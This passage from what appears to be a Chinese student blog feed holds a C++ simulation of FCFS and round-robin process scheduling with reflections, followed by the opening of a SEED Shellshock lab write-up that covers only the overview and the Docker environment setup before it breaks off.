class="hljs-title">cmp_FCFS</span><span class="hljs-params">(process a, process b)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (a.arrive != b.arrive)<br><span class="hljs-keyword">return</span> a.arrive &lt; b.arrive;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> a.id &lt; b.id;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">cmp_id</span><span class="hljs-params">(process a, process b)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> a.id &lt; b.id;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入算法类型（0:FCSS 1:RR）：&quot;</span>;<br>cin &gt;&gt; k;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入进程个数：&quot;</span>;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">if</span> (k == <span class="hljs-number">1</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入时间片大小：&quot;</span>;<br>cin &gt;&gt; q;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入RR算法类型（0:时间片固定 1:时间片可变）:&quot;</span>;<br>cin &gt;&gt; k_RR;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;请按进程到达先后输入进程信息（1~n）：到达时间 区间时间&quot;</span> &lt;&lt;<br>endl; <span class="hljs-comment">//要求按到达先后顺序输入，以便于到达时间相同时判断先后</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;进程&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;:&quot;</span>;<br>cin &gt;&gt; proc[i].arrive &gt;&gt; proc[i].work;<br><span class="hljs-comment">//信息初始化</span><br>proc[i].id = i;<br>proc[i].in = <span class="hljs-number">0</span>;<br>proc[i].begin = <span class="hljs-number">-1</span>; <span class="hljs-comment">//表示还没开始</span><br>proc[i].finish = <span class="hljs-number">0</span>;<br>proc[i].<span class="hljs-type">block_t</span> = <span class="hljs-number">0</span>;<br>proc[i].rest = proc[i].work;<br>&#125;<br><span class="hljs-built_in">sort</span>(proc, proc + n + <span class="hljs-number">1</span>, cmp_FCFS);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>proc[i].pos = i;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">block_check</span><span class="hljs-params">()</span> <span class="hljs-comment">//查看阻塞队列中是否有进程被唤醒</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span> (!block.<span class="hljs-built_in">empty</span>()) <span class="hljs-comment">//遍历旧阻塞队列一次</span><br>&#123;<br>process t2 = block.<span class="hljs-built_in">front</span>();<br>block.<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">if</span> (t2.block_p != now) <span class="hljs-comment">//如果不是刚被阻塞，则有唤醒的可能</span><br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">rand</span>() % <span class="hljs-number">2</span>) <span class="hljs-comment">//设定阻塞进程有1/2的概率被唤醒</span><br>&#123;<br>t2.<span class="hljs-type">block_t</span> += (now - t2.block_p); <span class="hljs-comment">//更新阻塞时长</span><br>cout &lt;&lt; <span class="hljs-string">&quot;在时刻&quot;</span> &lt;&lt; now &lt;&lt; <span class="hljs-string">&quot;，进程&quot;</span> &lt;&lt; t2.id &lt;&lt; <span class="hljs-string">&quot;被唤醒&quot;</span> &lt;&lt; endl;<br>ready.<span class="hljs-built_in">push</span>(t2);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-comment">//仍被阻塞，入新阻塞队列</span><br>&#123;<br>block_new.<span class="hljs-built_in">push</span>(t2);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-comment">//刚被阻塞，入新阻塞队列</span><br>&#123;<br>block_new.<span class="hljs-built_in">push</span>(t2);<br>&#125;<br>&#125;<br>block = block_new; <span class="hljs-comment">//阻塞队列更新</span><br><span class="hljs-keyword">while</span> (!block_new.<span class="hljs-built_in">empty</span>()) <span class="hljs-comment">//清空临时的阻塞队列</span><br>&#123;<br>block_new.<span class="hljs-built_in">pop</span>();<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">FCFS_And_RR</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">srand</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-built_in">time</span>(<span class="hljs-number">0</span>))); <span class="hljs-comment">//随机数生成种子随系统时间变化</span><br><span class="hljs-type">int</span> left = n; <span class="hljs-comment">//剩余的未完成进程数</span><br><span class="hljs-type">int</span> once_max; <span class="hljs-comment">//一个进程最大连续运行时间</span><br><span class="hljs-type">int</span> once; <span class="hljs-comment">//记录一个进程一次的运行时间</span><br><span class="hljs-keyword">while</span> (left &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">//有进程没有完成</span><br>&#123;<br><span class="hljs-type">int</span> min_arrive = <span class="hljs-number">0x3f3f3f</span>; <span class="hljs-comment">//未到达进程的最小到达时间（可能有多个进程）</span><br><span class="hljs-type">int</span> in_flag = <span class="hljs-number">0</span>; <span class="hljs-comment">//当前时间是否有进程入就绪队列</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (!proc[i].in &amp;&amp; proc[i].arrive &lt; min_arrive)<br>&#123;<br>min_arrive = proc[i].arrive;<br>in_flag = <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (min_arrive &gt;= now &amp;&amp; in_flag)<br>&#123;<br><span class="hljs-comment">//若当前时间小于剩余未完成进程（存在时in_flag=1）的最小到达时间，则输出以下信息并更新值</span><br><span class="hljs-keyword">if</span> (min_arrive &gt; now)<br>cout &lt;&lt; <span class="hljs-string">&quot;在时间&quot;</span> &lt;&lt; now &lt;&lt; <span class="hljs-string">&quot;-&quot;</span> &lt;&lt; min_arrive &lt;&lt; <span class="hljs-string">&quot;内,没有进程在运行&quot;</span> &lt;&lt; endl;<br>now = min_arrive;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (proc[i].arrive == min_arrive)<br>&#123;<br>proc[i].in = <span class="hljs-number">1</span>;<br>ready.<span class="hljs-built_in">push</span>(proc[i]);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (!ready.<span class="hljs-built_in">empty</span>())<br>&#123;<br>process t = ready.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//取出就绪队列队首</span><br>ready.<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">if</span> (t.begin == <span class="hljs-number">-1</span>) <span class="hljs-comment">//如果是第一次出就绪队列</span><br>&#123;<br>t.begin = now; <span class="hljs-comment">//开始时间=当前时间</span><br>&#125;<br><span class="hljs-keyword">if</span> (k == <span class="hljs-number">0</span>) <span class="hljs-comment">//FCFS</span><br>&#123;<br>once_max = t.rest; <span class="hljs-comment">//一个进程单次最大运行时间为剩余区间时间（即不发生阻塞的情况）</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-comment">//RR</span><br>&#123;<br>once_max = <span class="hljs-built_in">min</span>(q, t.rest);<br><span class="hljs-comment">//一个进程单次最大运行时间为时间片长度和剩余区间时间的相比较的最小值</span><br>&#125;<br>once = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (once &lt; once_max) <span class="hljs-comment">//一个进程运行中</span><br>&#123;<br>now++; <span class="hljs-comment">//当前时间加1</span><br>once++; <span class="hljs-comment">//单次进程运行时间加1</span><br>t.rest--; <span class="hljs-comment">//剩余时间减1</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) <span class="hljs-comment">//遍历所有进程</span><br>&#123;<br><span class="hljs-keyword">if</span> (!proc[i].in &amp;&amp; proc[i].arrive == now) <span class="hljs-comment">//若有进程还没有进入过就绪队列，且当前到达</span><br>&#123;<br>proc[i].in = <span class="hljs-number">1</span>; <span class="hljs-comment">//更改标记</span><br>ready.<span class="hljs-built_in">push</span>(proc[i]); <span class="hljs-comment">//进入就绪队列</span><br>&#125;<br>&#125;<br><span class="hljs-built_in">block_check</span>(); <span class="hljs-comment">//查看阻塞队列中是否有进程被唤醒</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">rand</span>() % <span class="hljs-number">10</span> == <span class="hljs-number">0</span> &amp;&amp; t.rest != <span class="hljs-number">0</span>)<span class="hljs-comment">//设定当前进程单位时间有1/10的概率发生阻塞</span><br>&#123;<br>t.block_p = now; <span class="hljs-comment">//更新最近一次被阻塞的时间点</span><br>block.<span class="hljs-built_in">push</span>(t); <span class="hljs-comment">//阻塞，入阻塞队列队尾</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (t.rest &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">//剩余时间大于0</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;在时间&quot;</span> &lt;&lt; now - once &lt;&lt; <span class="hljs-string">&quot;-&quot;</span> &lt;&lt; now &lt;&lt; <span class="hljs-string">&quot;内,进程&quot;</span> &lt;&lt; t.id &lt;&lt; <span class="hljs-string">&quot;在运行&quot;</span>;<br><span class="hljs-keyword">if</span> (t.block_p == now) <span class="hljs-comment">//说明阻塞</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;,后阻塞&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-comment">//没阻塞则入就绪队列</span><br>&#123;<br>ready.<span class="hljs-built_in">push</span>(t);<br>&#125;<br>cout &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-comment">//剩余时间等于0，表示运行完成</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;在时间&quot;</span> &lt;&lt; now - once &lt;&lt; <span class="hljs-string">&quot;-&quot;</span> &lt;&lt; now &lt;&lt; <span class="hljs-string">&quot;内,进程&quot;</span> &lt;&lt; t.id &lt;&lt; <span class="hljs-string">&quot;在运行。该进程完成。&quot;</span> &lt;&lt; endl;<br>t.end = now; <span class="hljs-comment">//完成时间=当前时间</span><br>t.finish = <span class="hljs-number">1</span>; <span class="hljs-comment">//更新标记：已完成</span><br>t.turnaround = t.end - t.arrive; <span class="hljs-comment">//周转时间=完成时间-到达时间</span><br>t.wait = t.turnaround - t.work - t.<span class="hljs-type">block_t</span>; <span class="hljs-comment">//等待时间=周转时间-区间时间-阻塞时间</span><br>proc[t.pos] = t; <span class="hljs-comment">//更新（已完成的）进程信息</span><br>left--; <span class="hljs-comment">//剩余进程数减1</span><br><span class="hljs-keyword">if</span> (k == <span class="hljs-number">1</span> &amp;&amp; k_RR == <span class="hljs-number">1</span>) <span class="hljs-comment">//时间片可变的RR算法</span><br>&#123;<br>q = ((<span class="hljs-type">double</span>)n / left) * q;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-comment">//可能当就绪队列为空时，也有进程在阻塞队列</span><br>&#123;<br><span class="hljs-type">int</span> in_block = <span class="hljs-number">0</span>; <span class="hljs-comment">//停留在阻塞队列的时间</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">block_check</span>();<span class="hljs-comment">//查看阻塞队列中是否有进程被唤醒</span><br><span class="hljs-keyword">if</span> (left == block.<span class="hljs-built_in">size</span>() &amp;&amp; left &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">//如果未完成的进程都在阻塞队列里</span><br>&#123;<br>in_block++; <span class="hljs-comment">//更新停留在阻塞队列的时间，继续进行循环</span><br>now++;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">break</span>; <span class="hljs-comment">//否则只进行一次遍历，因为还有其他没有在阻塞队列的进程</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (in_block &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">//只剩阻塞队列中的进程，且没运行，输出信息</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;在时间&quot;</span> &lt;&lt; now - in_block &lt;&lt; <span class="hljs-string">&quot;-&quot;</span> &lt;&lt; now  &lt;&lt; <span class="hljs-string">&quot;内,没有进程在运行&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">display</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">sort</span>(proc, proc + n + <span class="hljs-number">1</span>, cmp_id);<br>cout &lt;&lt; <span class="hljs-string">&quot;所有进程已完成，结果如下：&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; <span class="hljs-string">&quot;进程编号&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;到达时间&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;区间时间&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;开始时间&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<br><span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;完成时间&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;周转时间&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;等待时间&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;阻塞时间&quot;</span>;<br>cout &lt;&lt; endl;<br><span class="hljs-type">int</span> sum_work = <span class="hljs-number">0</span>, sum_turnaround = <span class="hljs-number">0</span>, sum_wait = <span class="hljs-number">0</span>, sum_block = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//总区间（服务）时间，总周转时间，总等待时间，平均阻塞时间</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>sum_work += proc[i].work;<br>sum_turnaround += proc[i].turnaround;<br>sum_block += proc[i].<span class="hljs-type">block_t</span>;<br>sum_wait += proc[i].wait;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; proc[i].id &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; proc[i].arrive &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; proc[i].work &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; proc[i].begin &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; proc[i].end &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; proc[i].turnaround &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; proc[i].wait &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; proc[i].<span class="hljs-type">block_t</span> &lt;&lt; endl;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;平均周转时间：&quot;</span> &lt;&lt; (<span class="hljs-type">double</span>)sum_turnaround / n &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;平均带权周转时间：&quot;</span> &lt;&lt; (<span class="hljs-type">double</span>)sum_turnaround / sum_work / n &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;平均等待时间：&quot;</span> &lt;&lt; (<span class="hljs-type">double</span>)sum_wait / n &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;平均阻塞时间：&quot;</span> &lt;&lt; (<span class="hljs-type">double</span>)sum_block / n &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">init</span>();<br><span class="hljs-built_in">FCFS_And_RR</span>();<br><span class="hljs-built_in">display</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="程序运行时的初值和运行结果"><a href="#程序运行时的初值和运行结果" class="headerlink" title="程序运行时的初值和运行结果"></a>程序运行时的初值和运行结果</h2><h3 id="FCFS"><a href="#FCFS" class="headerlink" title="FCFS"></a>FCFS</h3><h4 id="初值"><a href="#初值" class="headerlink" title="初值"></a>初值</h4><p><img src="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E7%9A%84%E8%AE%BE%E8%AE%A1/image-20211116174257026-16386296754991.png" alt="image-20211116174257026"></p><h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p><img src="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E7%9A%84%E8%AE%BE%E8%AE%A1/image-20211116173854064-16386296786083.png" alt="image-20211116173854064"></p><h3 id="RR-时间片固定"><a href="#RR-时间片固定" class="headerlink" title="RR-时间片固定"></a>RR-时间片固定</h3><h4 id="初值-1"><a href="#初值-1" class="headerlink" title="初值"></a>初值</h4><p><img src="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E7%9A%84%E8%AE%BE%E8%AE%A1/image-20211116173837962-16386296818855.png" alt="image-20211116173837962"></p><h4 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h4><p><img src="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E7%9A%84%E8%AE%BE%E8%AE%A1/image-20211116173854064-16386296834527.png" alt="image-20211116173854064"></p><h3 id="RR-可变时间片"><a href="#RR-可变时间片" class="headerlink" title="RR-可变时间片"></a>RR-可变时间片</h3><h4 id="初值-2"><a href="#初值-2" class="headerlink" title="初值"></a>初值</h4><p><img src="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E7%9A%84%E8%AE%BE%E8%AE%A1/image-20211116173935445-16386296849179.png" alt="image-20211115234014542"></p><h4 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h4><p><img src="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E7%9A%84%E8%AE%BE%E8%AE%A1/image-20211116173951387-163862968718611.png" alt="image-20211116173951387"></p><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><ul><li><p>根据上面的观察结果，比较这两种算法各自的优缺点，根据结果再和其他的算法比较。</p><ul><li><p>FCFS（先到先服务）调度算法优点：</p><ul><li>简单，容易理解。</li></ul></li><li><p>FCFS（先到先服务）调度算法缺点：</p><ul><li><p>所有其他进程都等待一个大进程释放 CPU，与让较短进程先进行相比，这会导致 CPU 和设备的使用率降低。</p></li><li><p>FCFS 调度算法是非抢占的。一旦 CPU 分配给了一个进程，该进程就会使用 CPU 直到释放 CPU 为止，不适用于分时系统。</p></li></ul></li><li><p>RR（轮转法）调度算法优点：</p><ul><li>适合分时系统，公平性较好。</li></ul></li><li><p>RR（轮转法）调度算法缺点：</p><ul><li>紧迫任务响应较慢。</li><li>时间片选取若太小，会频繁发生中断、进程上下文切换，增加系统开销，但利于短作业；若太大，退化成FCFS</li></ul></li></ul></li></ul><h2 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h2><ul><li>这个程序是我三番五次精心打磨写成的。在最开始的时候，我先不考虑阻塞队列，分别完成了FCFS算法和RR算法，并且没有逐时刻去模拟入队出队情况，而是在用FCFS规则排序的基础上，逐进程/时间片去模拟并打印一个时间段的信息。但是后来考虑阻塞后，因为阻塞队列中的进程随时可能被唤醒，则使得程序要逐时刻地去查看进程出队入队情况，在这方面的修改我花了一番功夫。同时需要注意对于时间的模拟是连续的，这要求更改当前时间的代码位置和关系式需要合适，否则可能出现时间不正常跨越等异常情况。</li><li>在打印信息方面，在进程调度过程中，某时刻进程被唤醒的信息和各个时间段进程的运行情况将会输出到屏幕上。对于最终结果，我则是在输出每个进程“开始时间”、“完成时间”、“周转时间”、“等待时间“的基础上额外添加了总体的平均周转时间、平均加权周转时间、平均等待时间、平均阻塞时间，方便不同的算法进行比较。提及时间，在时间片可变的轮转法调度中，何时改变时间片也是需要考虑的：根据要求，响应时间一定，时间片的长短依据就绪队列进程数量的多少由$T=N*(q+t)$的关系调整（T为响应时间（固定），N为就绪队列进程数，q为时间片的长短，t为上下文切换时间。其中q为毫秒级及以上，上下文切换时间t为纳秒级而忽略不计）。即就绪队列进程数有变化时，时间片需要调整。</li><li>后来我还发现FCFS算法和RR算法只有在一个进程最大连续运行时间（代码中为<code>once_max</code>）上有所不同。故我把两个算法的函数合并在一起写，即在FCFS算法的基础上增加关于<code>once_max</code>的判断和是否改变时间片的判断。同时，我将使用两次查看阻塞队列中是否有进程被唤醒的过程提取出来单独作一个函数（代码中为<code>block_check()</code>）。这两个修改大大减少了代码量（从400+行减至260+行）。整个实验过程中还出现了不少bug（死循环等），这时候我通常通过使用调试工具来解决问题，改进代码。</li><li>总之，通过本次实验，我对进程的调度算法有了更深的理解。在从课堂中学到的知识基础上，只有当自己实现代码来模拟算法时，才能切身感受到进程调度算法的精妙之处。因为编写这个代码除了了解进程各个时间的含义和计算方法，还有知道在调度过程中进程何时出入就绪队列和阻塞队列，选用哪种数据结构更合适等细节问题。整个实验加深了对进程的“先入先服务”和“时间片轮转”这两种调度方式的理解，有效地提高了我的逻辑思维和编程能力。</li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统课程实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shellshock Lab</title>
    <link href="/2021/10/29/Shellshock/"/>
    <url>/2021/10/29/Shellshock/</url>
    
    <content type="html"><![CDATA[<h1 id="Shellshock"><a href="#Shellshock" class="headerlink" title="Shellshock"></a><a href="https://seedsecuritylabs.org/Labs_20.04/Software/Shellshock/">Shellshock</a></h1><h2 id="1-Overview-概述"><a href="#1-Overview-概述" class="headerlink" title="1 Overview-概述"></a>1 Overview-概述</h2><ul><li>2014 年 9 月 24 日，发现了 bash 中的一个严重漏洞。 该漏洞绰号为 Shellshock，可以利用许多系统并从远程或从本地计算机启动。 在本实验中，学生需要研究此攻击，以便了解 Shellshock 漏洞。 本实验的学习目标是让学生亲身体验这次有趣的攻击，了解它是如何工作的，并思考我们可以从这次攻击中吸取的教训。 本实验涵盖以下主题：<ul><li>Shellshock</li><li>环境变量 </li><li>bash 中的函数定义 </li><li>Apache 和 CGI 程序</li></ul></li></ul><h3 id="Lab-environment-实验环境"><a href="#Lab-environment-实验环境" class="headerlink" title="Lab environment-实验环境"></a>Lab environment-实验环境</h3><ul><li>该实验已在我们预先构建的 Ubuntu 20.04 VM 上进行了测试，该 VM 可从 SEED 网站下载。 由于我们使用容器来设置实验室环境，因此本实验不太依赖 SEED VM。 可以使用其他 VM、物理机或云上的 VM 来完成此实验。</li></ul><h2 id="2-Environment-Setup-环境设置"><a href="#2-Environment-Setup-环境设置" class="headerlink" title="2 Environment Setup-环境设置"></a>2 Environment Setup-环境设置</h2><h3 id="2-1-DNS-Setting-DNS设置"><a href="#2-1-DNS-Setting-DNS设置" class="headerlink" title="2.1 DNS Setting-DNS设置"></a>2.1 DNS Setting-DNS设置</h3><p>​        在我们的设置中，Web 服务器容器的 IP 地址是 10.9.0.80。 服务器的主机名称为 www.seedlab-shellshock.com。 我们需要将此名称映射到 IP 地址。 请将以下内容添加到 /etc/hosts 中。 你需要使用root权限来修改这个文件：</p><figure class="highlight accesslog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs accesslog"><span class="hljs-number">10.9.0.80</span>www.seedlab-shellshock.com<br></code></pre></div></td></tr></table></figure><p><img src="/2021/10/29/Shellshock/image-20211027165835745.png" alt="image-20211027165835745"></p><h3 id="2-2-Container-Setup-and-Commands-容器设置和命令"><a href="#2-2-Container-Setup-and-Commands-容器设置和命令" class="headerlink" title="2.2 Container Setup and Commands-容器设置和命令"></a>2.2 Container Setup and Commands-容器设置和命令</h3><p>​        请从实验室网站下载 Labsetup.zip 文件到您的虚拟机，解压，进入 Labsetup 文件夹，使用 docker-compose.yml 文件设置实验室环境。 该文件内容的详细说明以及所有涉及的Dockerfile可以从用户手册中找到，该手册链接到本实验室的网站。 如果这是您第一次使用容器设置 SEED 实验室环境，阅读用户手册非常重要。</p><p>​        下面我们列出一些与 Docker 和 Compose 相关的常用命令。 由于我们将非常频繁地使用这些命令，因此我们在 .bashrc 文件（在我们提供的 SEEDUbuntu 20.04 VM 中）为它们创建了别名。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shel">$ docker-compose build # Build the container image<br>$ docker-compose up # Start the container<br>$ docker-compose down # Shut down the container<br>// Aliases for the Compose commands above<br>$ dcbuild # Alias for: docker-compose build<br>$ dcup # Alias for: docker-compose up<br>$ dcdown # Alias for: docker-compose down<br></code></pre></div></td></tr></table></figure><p>​        所有容器都将在后台运行。 要在容器上运行命令，我们通常需要在该容器上获得一个 shell。 我们首先需要使用“docker ps”命令找出容器的ID，然后使用“docker exec”在该容器上启动一个shell。 我们在 .bashrc 文件中为它们创建了别名。</p><figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> dockps <span class="hljs-comment">// Alias for: docker ps --format &quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span><br><span class="hljs-symbol">$</span> docksh &lt;id&gt; <span class="hljs-comment">// Alias for: docker exec -it &lt;id&gt; /bin/bash</span><br><span class="hljs-comment">// The following example shows how to get a shell inside hostC</span><br><span class="hljs-symbol">$</span> dockps<br>b1004832e275 hostA<span class="hljs-number">-10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span><br><span class="hljs-number">0</span>af4ea7a3e2e hostB<span class="hljs-number">-10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.6</span><br><span class="hljs-number">9652715</span>c8e0a hostC<span class="hljs-number">-10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.7</span><br><span class="hljs-symbol">$</span> docksh <span class="hljs-number">96</span><br>root@<span class="hljs-number">9652715</span>c8e0a:/#<br><span class="hljs-comment">// <span class="hljs-doctag">Note:</span> If a docker command requires a container ID, you do not need to</span><br><span class="hljs-comment">// type the entire ID string. Typing the first few characters will</span><br><span class="hljs-comment">// be sufficient, as long as they are unique among all the containers.</span><br></code></pre></div></td></tr></table></figure><p><strong>实验记录</strong>：  <img src="/2021/10/29/Shellshock/image-20211027201946906.png" alt="image-20211027201946906">  <img src="/2021/10/29/Shellshock/image-20211027202012172.png" alt="image-20211027202012172">  <img src="/2021/10/29/Shellshock/image-20211027203134116.png" alt="image-20211027203134116"></p><h3 id="2-3-Web-Server-and-CGI-Web-服务器和-CGI"><a href="#2-3-Web-Server-and-CGI-Web-服务器和-CGI" class="headerlink" title="2.3 Web Server and CGI-Web 服务器和 CGI"></a>2.3 Web Server and CGI-Web 服务器和 CGI</h3><p>​        在本实验中，我们将对 Web 服务器容器发起 Shellshock 攻击。 许多 Web 服务器启用 CGI，这是一种用于在网页和 Web 应用程序上生成动态内容的标准方法。 